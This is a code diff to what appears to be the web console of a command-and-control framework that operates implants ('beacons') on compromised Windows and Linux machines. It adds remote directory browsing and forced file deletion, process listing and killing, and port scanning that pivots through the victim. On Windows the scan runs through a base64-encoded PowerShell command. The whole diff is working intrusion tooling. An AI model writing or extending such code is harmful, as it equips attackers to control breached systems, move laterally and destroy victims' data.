@@ -427,9 +427,29 @@ function parseLs(text: string): FileEntry[] {
   return entries;
 }
 
+// parseDirWin 解析 Windows `dir /A` 输出（beacon 已 GBK→UTF-8，文本干净）。
+// 行形如：2026/11/08  00:30    <DIR>          .
+//         11/08/2026  09:00 PM         6,868,480 beacon.exe
+function parseDirWin(text: string): FileEntry[] {
+  const entries: FileEntry[] = [];
+  for (const line of text.split("\n")) {
+    const cl = line.trim();
+    if (!cl) continue;
+    const m = cl.match(/^(\d{4}[/-]\d{2}[/-]\d{2}\s+\d{2}:\d{2}(?:\s*[AP]M)?|\d{1,2}[/-]\d{1,2}[/-]\d{4}\s+\d{1,2}:\d{2}\s*[AP]M)\s+(<DIR>|<JUNCTION>|<SYMLINKD>|[\d,\.]+)\s+(.+)$/);
+    if (!m) continue;
+    const name = m[3].trim().split(" -> ")[0];
+    if (!name || name === ".") continue;
+    if (/File\(s\)|Dir\(s\)|个文件|个目录|可用字节|bytes free/i.test(name)) continue;
+    const isDir = m[2].startsWith("<");
+    entries.push({ perms: isDir ? "<DIR>" : "-", size: isDir ? "-" : m[2], date: m[1], name, isDir: isDir || name === ".." });
+  }
+  return entries;
+}
+
 function FilesPanel({ beacon }: { beacon: BeaconRow }) {
-  const [cwd, setCwd] = React.useState("/root");
-  const [pathInput, setPathInput] = React.useState("/root");
+  const isWin = (beacon.osType || "").toLowerCase().includes("win");
+  const [cwd, setCwd] = React.useState(isWin ? "C:\\Users\\Public" : "/root");
+  const [pathInput, setPathInput] = React.useState(isWin ? "C:\\Users\\Public" : "/root");
   const [entries, setEntries] = React.useState<FileEntry[]>([]);
   const [msg, setMsg] = React.useState("");
   const [raw, setRaw] = React.useState("");
@@ -437,15 +457,20 @@ function FilesPanel({ beacon }: { beacon: BeaconRow }) {
   const selRef = React.useRef<FileEntry | null>(null);
   const [selName, setSelName] = React.useState("");
 
-  const jpath = (n: string) => `${cwd.replace(/\/+$/, "")}/${n}`;
+  const jpath = (n: string) => isWin
+    ? `${cwd.replace(/[\\]+$/, "")}\\${n}`
+    : `${cwd.replace(/\/+$/, "")}/${n}`;
+  const parent = (p: string) => isWin
+    ? (p.replace(/[\\]+$/, "").split("\\").slice(0, -1).join("\\") || "C:\\")
+    : (p.replace(/\/+$/, "").replace(/\/[^/]+$/, "") || "/");
 
   const ls = async (p?: string) => {
     const dest = p ?? cwd;
     setMsg("");
-    const r = await exec(`ls -la ${JSON.stringify(dest)}`);
+    const r = await exec(isWin ? `dir /A ${JSON.stringify(dest)}` : `ls -la ${JSON.stringify(dest)}`);
     if (!r.output) { setMsg("[!] " + (r.error || "无输出")); setEntries([]); setRaw(r.output); return; }
     setRaw(r.output);
-    const es = parseLs(r.output);
+    const es = isWin ? parseDirWin(r.output) : parseLs(r.output);
     es.sort((a, b) => (b.isDir ? 1 : 0) - (a.isDir ? 1 : 0) || a.name.localeCompare(b.name));
     setEntries(es);
     setCwd(dest);
@@ -494,7 +519,10 @@ function FilesPanel({ beacon }: { beacon: BeaconRow }) {
 
   const del = async (f: FileEntry) => {
     if (!window.confirm(`删除 ${f.name}？`)) return;
-    const r = await exec(`rm -rf ${JSON.stringify(jpath(f.name))}`);
+    const rmCmd = isWin
+      ? (f.isDir ? `rmdir /S /Q ${JSON.stringify(jpath(f.name))}` : `del /F /Q ${JSON.stringify(jpath(f.name))}`)
+      : `rm -rf ${JSON.stringify(jpath(f.name))}`;
+    const r = await exec(rmCmd);
     setMsg(r.output || r.error || "[*] 已删除");
     ls(cwd);
   };
@@ -502,13 +530,13 @@ function FilesPanel({ beacon }: { beacon: BeaconRow }) {
   const mkdir = async () => {
     const n = window.prompt("新目录名");
     if (!n) return;
-    await exec(`mkdir -p ${JSON.stringify(jpath(n))}`);
+    await exec(isWin ? `md ${JSON.stringify(jpath(n))}` : `mkdir -p ${JSON.stringify(jpath(n))}`);
     ls(cwd);
   };
 
   const enter = (f: FileEntry) => {
     if (!f.isDir) return;
-    if (f.name === "..") { ls(cwd.replace(/\/[^/]+$/, "") || "/"); return; }
+    if (f.name === "..") { ls(parent(cwd)); return; }
     ls(jpath(f.name));
   };
 
@@ -558,16 +586,17 @@ function FilesPanel({ beacon }: { beacon: BeaconRow }) {
 function ProcessPanel({ beacon }: { beacon: BeaconRow }) {
   const [raw, setRaw] = React.useState("");
   const [rows, setRows] = React.useState<{ pid: string; cmd: string }[]>([]);
-  const { busy, exec } = useTask(beacon.id);
+  const { busy, exec, run } = useTask(beacon.id);
     const isWin = (beacon.osType || "").toLowerCase().includes("win");
   const list = async () => {
-    const r = await exec(isWin ? "tasklist" : "ps aux | head -80");
+    const r = await exec(isWin ? "tasklist /FO CSV /NH" : "ps aux | head -80");
     setRaw(r.output || r.error || "");
     const es: { pid: string; cmd: string }[] = [];
     if (isWin) {
+      // CSV：\"name.exe\",\"1234\",\"Console\",\"1\",\"12,776 K\"（无表头）
       for (const line of (r.output || "").split("\n")) {
-        const m = line.trim().match(/^(\S+)\s+(\d+)\s+\S+\s+\d+\s+\S+$/);
-        if (m) es.push({ pid: m[2], cmd: m[1].slice(0, 90) });
+        const m = line.match(/^"([^"]+)",\"(\d+)\",\"[^"]*\",\"\d+\",\"([^"]*)\"\s*$/);
+        if (m) es.push({ pid: m[2], cmd: `${m[1]}  [mem ${m[3]}]`.slice(0, 90) });
       }
     } else {
       for (const line of (r.output || "").split("\n").slice(1)) {
@@ -590,9 +619,9 @@ function ProcessPanel({ beacon }: { beacon: BeaconRow }) {
     <div className="flex h-full flex-col text-[13px]">
       <div className="flex items-center gap-2 border-b border-zinc-800 px-2 py-1">
         <button className="flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-2 py-1 hover:bg-zinc-700 disabled:opacity-40" onClick={list} disabled={busy}>
-          <RefreshCw className={`size-4 ${busy ? "animate-spin" : ""}`} /> ps aux（前 80）
+          <RefreshCw className={`size-4 ${busy ? "animate-spin" : ""}`} /> {isWin ? "tasklist" : "ps aux（前 80）"}
         </button>
-        <span className="text-zinc-500">行内 Kill 对目标进程发 kill -9</span>
+        <span className="text-zinc-500">行内 Kill 对目标进程发 {isWin ? "taskkill /F" : "kill -9"}</span>
       </div>
       <div className="min-h-0 flex-1 overflow-auto">
         <table className="w-full">
@@ -620,20 +649,35 @@ function NetworkPanel({ beacon }: { beacon: BeaconRow }) {
   const [host, setHost] = React.useState("127.0.0.1");
   const [ports, setPorts] = React.useState("22,80,443,3306,5432,6379,8080,8443");
   const [out, setOut] = React.useState("");
-  const { busy, exec } = useTask(beacon.id);
+  const { busy, exec, run } = useTask(beacon.id);
+  const isWin = (beacon.osType || "").toLowerCase().includes("win");
 
-  // 以目标机为跳板：bash /dev/tcp 并发探测（一条命令完成全部端口）
+  // 以目标机为跳板探测：Linux=bash /dev/tcp 并发；Windows=PowerShell TcpClient
   const scan = async () => {
-    const p = ports.split(",").map((x) => x.trim()).filter(Boolean).join(" ");
+    const ps = ports.split(",").map((x) => x.trim()).filter(Boolean);
     setOut("[*] 扫描中…");
-    // /dev/tcp 是 bash 特性——beacon exec 走 sh(dash)，必须显式 bash -c
-    const r = await exec(`bash -c 'for p in ${p}; do (echo >/dev/tcp/${host}/$p) 2>/dev/null && echo "OPEN ${host}:$p"; done; echo SCAN-DONE'`);
+    let r: { output: string; error?: string };
+    if (isWin) {
+      // PS 脚本走 -EncodedCommand（base64 UTF-16LE）——-Command "...$var..." 经
+      // cmd /C 会被 PS 命令行层展开吃掉 $ 变量
+      const script = `foreach($p in @(${ps.join(",")})){ $c=New-Object Net.Sockets.TcpClient; $a=$c.BeginConnect('${host}',$p,$null,$null); if($a.AsyncWaitHandle.WaitOne(900) -and $c.Connected){ Write-Output ('OPEN ${host}:' + $p) }; $c.Close() }; Write-Output 'SCAN-DONE'`;
+      let bin = "";
+      for (let i = 0; i < script.length; i++) {
+        const cc = script.charCodeAt(i);
+        bin += String.fromCharCode(cc & 0xff) + String.fromCharCode(cc >> 8);
+      }
+      r = await run("exec", { cmd: `powershell -NoProfile -EncodedCommand ${btoa(bin)}` },
+        30000 + ps.length * 1200);
+    } else {
+      const p = ps.join(" ");
+      r = await exec(`bash -c 'for p in ${p}; do (echo >/dev/tcp/${host}/$p) 2>/dev/null && echo "OPEN ${host}:$p"; done; echo SCAN-DONE'`);
+    }
     setOut(r.output || "[!] " + (r.error || "无输出"));
   };
 
   const netstat = async () => {
     setOut("[*] 获取中…");
-    const r = await exec("netstat -antp 2>/dev/null | head -60 || netstat -an | head -60");
+    const r = await exec(isWin ? "netstat -ano" : "netstat -antp 2>/dev/null | head -60 || netstat -an | head -60");
     setOut(r.output || "[!] " + (r.error || "无输出"));
   };
 
